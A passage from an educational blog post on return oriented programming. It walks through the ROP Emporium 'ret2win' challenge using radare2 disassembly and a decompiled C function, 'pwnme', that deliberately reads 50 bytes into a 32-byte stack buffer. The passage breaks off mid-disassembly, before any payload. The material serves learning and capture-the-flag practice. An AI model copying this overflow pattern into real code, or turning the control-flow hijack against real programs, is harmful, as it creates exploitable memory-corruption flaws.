<!doctype html><html><head><title>Return Oriented Programming</title><link rel=stylesheet href=/css/style.css></head><body><nav class=header><div class=header-container><a href=/>Dangerous Assembly</a><div class=header-menu><a href=/index.xml>RSS</a>
<a href=https://github.com/tetzank/>github</a>
<a href=/publications/>publications</a>
<a href=/about/>about</a></div></div></nav><div id=content><main><article><header><time datetime="2019-06-15 21:40:00 &#43;0200 CEST" class=catalogue-time>2019-06-15</time><h1>Return Oriented Programming</h1><div class=post-line></div></header><aside><details><summary>Contents</summary><nav id=TableOfContents><ul><li><a href=#function-calls-in-x86-assembly>Function Calls in x86 Assembly</a></li><li><a href=#redirecting-control-flow>Redirecting Control Flow</a></li><li><a href=#chaining-gadgets>Chaining Gadgets</a></li><li><a href=#rop-mitigations>ROP Mitigations</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></details></aside><p>As a C++ programmer I am well aware of memory errors such as buffer overflows and dangling pointers.
There are a lot of good debugging tools available like Memcheck in Valgrind and Address Sanitizer in GCC and Clang which help identifying the root cause leading to the memory corruption.
But memory errors are not just bugs resulting in crashes or incorrect program behavior.
They are potentially severe security issues.
To better understand the risks involved, let us take a look at some basic concepts of exploitation, particularly at return oriented programming (ROP).</p><h1 id=function-calls-in-x86-assembly>Function Calls in x86 Assembly</h1><p>Before we get our hands dirty, we will briefly look at x86 assembly.
Don&rsquo;t panic!
We will only look at four instructions which are relevant for function calls and stack manipulation.
That&rsquo;s all we will need for the moment.</p><p>Function support is provided by two instructions at the assembly level: <code>call</code> and <code>ret</code>.
The <code>call</code> instructions takes the address of a function as an operand, either as a fixed address as part of the instruction encoding (immediate) or as a register holding the address (indirect call).
The latter one is used, among others, for virtual function calls as the address of the callee is not known at compile-time.
There are two operations <code>call</code> does.</p><ol><li>It pushes the address of the following instruction on the stack.
This will be the location where the program continues execution after the function call (return address).</li><li>It jumps to the address provided by the operand which transfers control flow to the callee.</li></ol><p>Notice, that <code>call</code> does not handle any function parameter.
They are passed in registers, and on the stack if a function has a lot of parameters.
The calling convention of the operating system specifies which registers have to be used by a conforming compiler.
Wikipedia has a nice <a href=https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions>overview</a> of the various calling conventions.
We will focus on x86-64 Linux.
There, the first six parameters are passed in <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code> and <code>r9</code>.
Any additional parameter is passed on the stack.
The callee assumes the caller adheres to the calling convention and uses the registers representing the parameters accordingly.</p><p>The <code>ret</code> instruction has to jump back to wherever the function call originated.
That is where the return address comes into play.
<code>ret</code> pops the address from the top of the stack where the previous <code>call</code> left it and transfers control flow back to the caller.
How the return value is transfered to the caller is again specified by the calling convention.
It is usually in the register <code>rax</code>.
The important thing to note here is that <code>ret</code> always gets the address to jump to from the top of the stack.</p><p>There are two more important instructions to manipulate the stack: <code>push</code> and <code>pop</code>.
<code>push</code> stores the value of its operand on the stack and grows the stack accordingly.
<code>pop</code> does the opposite.
It loads the value from the top of the stack into the register provided as operand and shrinks the stack.
These two instructions work in the same way as you would expect from push and pop operations on a stack data structure.</p><p>Now that we know some basic x86 assembly instructions, let&rsquo;s look at the first two challenges provided by
<a href=https://ropemporium.com/>ROP Emporium</a>
which is a very nice website to learn the basics of return oriented programming.
<strong>The following sections will hold your hand all the way through the first two challenges.
If you want to try them without spoilers then do so now.</strong></p><h1 id=redirecting-control-flow>Redirecting Control Flow</h1><p>The first challenge is called
<a href=https://ropemporium.com/challenge/ret2win.html>ret2Win</a>.
The description of the challenge already gives away what we have to do: overwrite the return address on the stack.
Remember, the <code>ret</code> instruction is data driven.
Whatever the address on top of the stack is, <code>ret</code> will jump to it.
If an attacker can overwrite this memory location, he can redirect control flow to an address of his liking.
And today, we are playing attacker.</p><p>But first, let&rsquo;s step back a little and let us analyse the executable we got.
We will focus on the 64 bit version and mostly use
<a href=https://radare.org/>Radare2 (r2)</a>
to analyse it.
<code>r2</code> is a very powerful reverse engineering tool.
Hence, it is quite complex.
We will take it step by step.</p><p>We load the program into <code>r2</code>, and get greeted by a fortune and a command prompt.
The first useful command is <code>i</code> which extracts general information from the opened file.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=font-weight:700;color:#ffff54>$</span><span style=color:#b2b2b2> r2 ./ret2win</span><br>-- /dev/brain: No such file or directory.<br><span style=color:#ff0>[0x00400650]&gt;</span><span style=color:#b2b2b2> i</span><br>fd &#160;&#160;&#160;&#160;&#160;&#160;3<br>file &#160;&#160;&#160;&#160;./ret2win<br>size &#160;&#160;&#160;&#160;0x2360<br>humansz &#160;8.8K<br>mode &#160;&#160;&#160;&#160;r-x<br>format &#160;&#160;elf64<br>iorw &#160;&#160;&#160;&#160;false<br>blksz &#160;&#160;&#160;0x0<br>block &#160;&#160;&#160;0x100<br>type &#160;&#160;&#160;&#160;EXEC (Executable file)<br>arch &#160;&#160;&#160;&#160;x86<br>baddr &#160;&#160;&#160;0x400000<br>binsz &#160;&#160;&#160;7071<br>bintype &#160;elf<br>bits &#160;&#160;&#160;&#160;64<br>canary &#160;&#160;false<br>class &#160;&#160;&#160;ELF64<br>compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609<br>crypto &#160;&#160;false<br>endian &#160;&#160;little<br>havecode true<br>intrp &#160;&#160;&#160;/lib64/ld-linux-x86-64.so.2<br>laddr &#160;&#160;&#160;0x0<br>lang &#160;&#160;&#160;&#160;c<br>linenum &#160;true<br>lsyms &#160;&#160;&#160;true<br>machine &#160;AMD x86-64 architecture<br>maxopsz &#160;16<br>minopsz &#160;1<br>nx &#160;&#160;&#160;&#160;&#160;&#160;true<br>os &#160;&#160;&#160;&#160;&#160;&#160;linux<br>pcalign &#160;0<br>pic &#160;&#160;&#160;&#160;&#160;false<br>relocs &#160;&#160;true<br>relro &#160;&#160;&#160;partial<br>rpath &#160;&#160;&#160;NONE<br>sanitiz &#160;false<br>static &#160;&#160;false<br>stripped false<br>subsys &#160;&#160;linux<br>va &#160;&#160;&#160;&#160;&#160;&#160;true<br></div></div><p>Commands in <code>r2</code> are categorized and structured in a command tree.
Short sequences of characters are used to navigate the tree, each character representing an option we picked.
For example, to get more detailed informations about the executable like the list of symbols, we use the command <code>is</code>, extending the command for general information <code>i</code>.
You can get a list of available options by adding a question mark at the end, e.g., <code>i?</code> or just <code>?</code> to get the top-level commands and other helpful explanations.</p><p>The list of symbols might be quite long.
We can filter the output of a command with the tilde <code>~</code> operator which is a builtin <code>grep</code>.
Filtering for symbols belonging to functions:</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400650]&gt;</span><span style=color:#b2b2b2> is~FUNC</span><br>030 0x00000680 0x00400680 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 deregister_tm_clones<br>031 0x000006c0 0x004006c0 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 register_tm_clones<br>032 0x00000700 0x00400700 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 __do_global_dtors_aux<br>035 0x00000720 0x00400720 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 frame_dummy<br>038 0x000007b5 0x004007b5 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;92 pwnme<br>039 0x00000811 0x00400811 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;32 ret2win<br>049 0x000008b0 0x004008b0 GLOBAL &#160;&#160;FUNC &#160;&#160;&#160;2 __libc_csu_fini<br>056 0x000008b4 0x004008b4 GLOBAL &#160;&#160;FUNC &#160;&#160;&#160;0 _fini<br>066 0x00000840 0x00400840 GLOBAL &#160;&#160;FUNC &#160;101 __libc_csu_init<br>068 0x00000650 0x00400650 GLOBAL &#160;&#160;FUNC &#160;&#160;42 _start<br>070 0x00000746 0x00400746 GLOBAL &#160;&#160;FUNC &#160;111 main<br>075 0x000005a0 0x004005a0 GLOBAL &#160;&#160;FUNC &#160;&#160;&#160;0 _init<br>001 0x000005d0 0x004005d0 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.puts<br>002 0x000005e0 0x004005e0 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.system<br>003 0x000005f0 0x004005f0 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.printf<br>004 0x00000600 0x00400600 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.memset<br>005 0x00000610 0x00400610 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.__libc_start_main<br>006 0x00000620 0x00400620 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.fgets<br>008 0x00000630 0x00400630 GLOBAL &#160;&#160;FUNC &#160;&#160;16 imp.setvbuf<br></div></div><p>We can also chain filters:</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400650]&gt;</span><span style=color:#b2b2b2> is~FUNC~LOCAL</span><br>030 0x00000680 0x00400680 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 deregister_tm_clones<br>031 0x000006c0 0x004006c0 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 register_tm_clones<br>032 0x00000700 0x00400700 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 __do_global_dtors_aux<br>035 0x00000720 0x00400720 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;&#160;0 frame_dummy<br>038 0x000007b5 0x004007b5 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;92 pwnme<br>039 0x00000811 0x00400811 &#160;LOCAL &#160;&#160;FUNC &#160;&#160;32 ret2win<br></div></div><p>Two functions stand out because of their suspicious names: <em>pwnme</em> and <em>ret2win</em>.
Let us have a look at <em>pwnme</em> first.
We seek to the function with <code>s 0x004007b5</code>.
Next, we analyse the function with <code>af</code> which among others determines the function boundaries.
From the symbol table we only got the entry point of the function.
With the boundaries analysed, we can print the disassembly of the function with <code>pdf</code>.
The last two commands work implicitly with the current position.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x000007b5]&gt;</span><span style=color:#b2b2b2> s 0x004007b5</span><br><span style=color:#ff0>[0x004007b5]&gt;</span><span style=color:#b2b2b2> af</span><br><span style=color:#ff0>[0x004007b5]&gt;</span><span style=color:#b2b2b2> pdf</span><br><span style=color:#0ff>/</span><span style=color:#b2b2b2> </span><span style=color:red>(fcn) sym.pwnme</span><span style=color:#b2b2b2> 92</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> &#160;&#160;</span><span style=color:red>sym.pwnme</span><span style=color:#b2b2b2> ();</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>; var </span><span style=color:#00f>int32_t var_20h </span><span style=color:#0ff>@ rbp-0x20</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007b5</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>55</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#f0f>push</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007b6</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>89e5</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> rsp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007b9</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>83ec</span><span style=color:#ff0>20</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>sub</span><span style=color:#0ff> rsp</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#ff0>0x20</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007bd</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>8d</span><span style=color:#ff0>45</span><span style=color:#fff>e0</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>lea</span><span style=color:#0ff> rax</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#b2b2b2>[</span><span style=color:#00f>var_20h</span><span style=color:#b2b2b2>]</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007c1</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>ba</span><span style=color:#ff0>20</span><span style=color:#0f0>000000</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edx</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#ff0>0x20</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; 32</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007c6</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>be</span><span style=color:#0f0>00000000</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> esi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> 0</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007cb</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>89c7</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rdi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> rax</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007ce</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8</span><span style=color:#ff0>2d</span><span style=color:#fff>fe</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.memset</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; void *memset(void *s, int c, size_t n)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007d3</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>bff808</span><span style=color:#ff0>40</span><span style=color:#0f0>00</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong</span><span style=color:red> ; 0x4008f8 ; "For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\nWhat could possibly go wrong?"</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007d8</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8f3fd</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.puts</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; int puts(const char *s)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007dd</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>bf</span><span style=color:#ff0>78</span><span style=color:#fff>09</span><span style=color:#ff0>40</span><span style=color:#0f0>00</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets</span><span style=color:red> ; 0x400978 ; "You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007e2</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8e9fd</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.puts</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; int puts(const char *s)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007e7</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>bfdd09</span><span style=color:#ff0>40</span><span style=color:#0f0>00</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#ff0>0x4009dd</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007ec</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>b8</span><span style=color:#0f0>00000000</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> eax</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> 0</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007f1</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e8fafd</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.printf</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; int printf(const char *format)</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007f6</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>8b15</span><span style=color:#ff0>73</span><span style=color:#fff>08</span><span style=color:#ff0>20</span><span style=color:#fff>.</span><span style=color:#b2b2b2> &#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rdx</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> qword </span><span style=color:#b2b2b2>[</span><span style=color:#0ff>obj.stdin</span><span style=color:#b2b2b2>]; MOV rdx = [0x601070] = 0x0 rsp</span><br><span style=color:red>; obj.stdin__GLIBC_2.2.5 ; [0x601070:8]=0</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x004007fd</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>8d</span><span style=color:#ff0>45</span><span style=color:#fff>e0</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>lea</span><span style=color:#0ff> rax</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#b2b2b2>[</span><span style=color:#00f>var_20h</span><span style=color:#b2b2b2>]</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400801</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>be</span><span style=color:#ff0>32</span><span style=color:#0f0>000000</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> esi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> </span><span style=color:#ff0>0x32</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; '2' ; 50</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400806</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>89c7</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rdi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> rax</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400809</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>e812fe</span><span style=color:red>ffff</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#0f0>call sym.imp.fgets</span><span style=color:red> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;; char *fgets(char *s, int size, FILE *stream)</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040080e</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>90</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#00f>nop</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x0040080f</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>c9</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=font-weight:700;color:#f0f>leave</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>\</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400810</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>c3</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:red>ret</span><span style=color:#b2b2b2></span><br></div></div><p>Well, now we just have to understand the assembly.
The function consists mostly of function calls to <em>memset</em>, <em>puts</em>, <em>printf</em> and <em>fgets</em>.
There are no complex calculations happening.
With the calling convention in mind, we can decompile it by hand to the following C function.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>pwnme</span>(){
	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>32</span>];
	memset(buf, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>32</span>);
	puts(<span style=color:#e6db74>&#34;For my first trick, I will attempt to fit 50 bytes of user input &#34;</span>
	     <span style=color:#e6db74>&#34;into 32 bytes of stack buffer;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>What could possibly go wrong?&#34;</span>);
	puts(<span style=color:#e6db74>&#34;You there madam, may I have your input please? And don&#39;t worry &#34;</span>
	     <span style=color:#e6db74>&#34;about null bytes, we&#39;re using fgets!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
	printf(<span style=color:#e6db74>&#34;&gt;&#34;</span>);
	fgets(buf, <span style=color:#ae81ff>50</span>, stdin);
}</code></pre></div><p>The programming bug is quite obvious.
The function stores with <em>fgets</em> up to 50 bytes of data from stdin into a stack buffer which is only 32 bytes large.
On x86 the stack grows downwards which means that by writing past the end of the buffer we overwrite previous elements deeper on the stack, like the return address which was pushed on the stack when calling the function.</p><p>So, we found an exploitable memory error.
Now, what do we do with it?
The task was to get the content of the file <em>flag.txt</em>.
Let us look at the other suspiciously named function <em>ret2win</em> using the same commands we just learned.</p><div class=term><div style=font-family:monospace,monospace;font-size:9pt;color:#b2b2b2;background-color:#000><span style=color:#ff0>[0x00400650]&gt;</span><span style=color:#b2b2b2> s 0x00400811</span><br><span style=color:#ff0>[0x00400811]&gt;</span><span style=color:#b2b2b2> af</span><br><span style=color:#ff0>[0x00400811]&gt;</span><span style=color:#b2b2b2> pdf</span><br><span style=color:#0ff>/</span><span style=color:#b2b2b2> </span><span style=color:red>(fcn) sym.ret2win</span><span style=color:#b2b2b2> 32</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> &#160;&#160;</span><span style=color:red>sym.ret2win</span><span style=color:#b2b2b2> ();</span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400811</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>55</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#f0f>push</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400812</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#ff0>48</span><span style=color:#fff>89e5</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> rbp</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> rsp</span><span style=color:#b2b2b2></span><br><span style=color:#0ff>|</span><span style=color:#b2b2b2> </span><span style=color:#0ff>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;</span><span style=color:#0f0>0x00400815</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;&#160;</span><span style=color:#fff>bfe009</span><span style=color:#ff0>40</span><span style=color:#0f0>00</span><span style=color:#b2b2b2> &#160;&#160;&#160;&#160;</span><span style=color:#fff>mov</span><span style=color:#0ff> edi</span><span style=color:#b2b2b2>,</span><span style=color:#0ff> str.Thank_you__Here_s_your_flag:</span><span style=color:red> ; 0x4009e0 ; "Thank you! Here's your flag:"</span><span style=color:#b2b2b2></span><br><span 